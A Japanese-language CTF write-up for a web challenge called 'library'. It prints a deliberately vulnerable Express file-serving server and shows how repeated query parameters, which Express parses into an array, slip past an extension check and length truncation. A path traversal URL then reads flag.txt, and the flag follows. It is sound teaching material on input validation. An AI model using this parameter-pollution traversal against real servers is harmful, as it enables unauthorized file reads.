# library:Web:400pts
I created a file library in my website. I don't have a lot of files, but take a look to the ones I have!  
![filelibrary.jpg](images/filelibrary.jpg)  
J'ai créé une bibliothèque web de fichiers. Je n'ai pas beaucoup de fichiers, mais j'espère que vous aimez ceux que j'ai !  
[http://143.198.224.219:8888](http://143.198.224.219:8888/)  
Hint  
Express query parsing vulnerability  
[server.js](server.js)  

# Solution
URLとソースが渡される。  
アクセスするとファイルをDLできるサービスのようだ。  
File Library  
[site.png](site/site.png)  
リンク先`/getFile?file=ok.js`では以下のコードがみられるが、関係なさそうだ。  
[ok.png](site/ok.png)  
リンク先`/getFile?file=a.cpp`では以下のコードが得られた。  
```cpp
#include <stdlib.h>
int main() {
    system("cat flag.txt");
}
```
flag.txtを読み取れば良いとわかる。  
配布されたソースを見ると以下のようであった。  
```JavaScript
const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Listening on port ${PORT}`);
});

app.get('/getFile', (req, res) => {
    let { file } = req.query;

    if (!file) {
        res.send(`file=${file}\nFilename not specified!`);
        return;
    }

    try {

        if (file.includes(' ') || file.includes('/')) {
            res.send(`file=${file}\nInvalid filename!`);
            return;
        }
    } catch (err) {
        res.send('An error occured!');
        return;
    }

    if (!allowedFileType(file)) {
        res.send(`File type not allowed`);
        return;
    }

    if (file.length > 5) {
        file = file.slice(0, 5);
    }

    const returnedFile = path.resolve(__dirname + '/' + file);

    fs.readFile(returnedFile, (err) => {
        if (err) {
            if (err.code != 'ENOENT') console.log(err);
            res.send('An error occured!');
            return;
        }

        res.sendFile(returnedFile);
    });
});

app.get('/*', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

function allowedFileType(file) {
    const format = file.slice(file.indexOf('.') + 1);

    if (format == 'js' || format == 'ts' || format == 'c' || format == 'cpp') {
        return true;
    }

    return false;
}
```
注目すべきは、以下の`allowedFileType`で拡張子を確認しているようだ。  
```JavaScript
~~~
function allowedFileType(file) {
    const format = file.slice(file.indexOf('.') + 1);

    if (format == 'js' || format == 'ts' || format == 'c' || format == 'cpp') {
        return true;
    }

    return false;
}
```
さらにその後、5文字という制限も入れているようだ。  
```JavaScript
    if (file.length > 5) {
        file = file.slice(0, 5);
    }
```
5文字で拡張子が`js`、`ts`、`c`、`cpp`のファイルしか読みだせないようになっているが`flag.txt`は8文字でtxtである。  
まずは拡張子のチェックバイパスを考える。  
`indexOf`が使われているので、配列を引数に入れる物が有効そうだ。
試しに`allowedFileType(["flag.txt",".","cpp"])`をチェックすると`true`になる。  
こうして拡張子チェックの問題は解決したかにみえるが、別の問題が発生する。  
以下のファイルのパス解決の部分である。  
```JavaScript
~~~
    const returnedFile = path.resolve(__dirname + '/' + file);
~~~
```
配列が文字列として扱われるため、`__dirname/flag.txt,.,cpp`という謎のファイル名になってしまう。  
まず後ろの`,.,cpp`を消さなければならない。  
ここで、5文字制限を思い出す。  
`file.slice(0, 5);`で5文字以降は切り捨てられるため、`["0","1","2","3","4","flag.txt",".","cpp"]`とすれば`flag.txt`で終わるようになる。  
現状ファイル名は`__dirname/0,1,2,3,4,flag.txt`となる。  
コンマが邪魔になるが、`path.resolve`なので存在しないパスを作りトラバーサルする`/test/../`手法が有効である。  
`["test","/../","/../","/../","/../","/../flag.txt",".","cpp"]`は`__dirname/test,/../,/../,/../,/../,/../flag.txt`となり`__dirname/flag.txt`と解決される。  
よって`http://143.198.224.219:8888/getFile?file=test&file=/../&file=/../&file=/../&file=/../flag.txt&file=.&file=cpp`にアクセスすればよい。  
[flag.png](site/flag.png)  
flagが表示された。  

## OFPPT-CTF{5h0uld_5tr1ng1fy_th3_p4r4ms}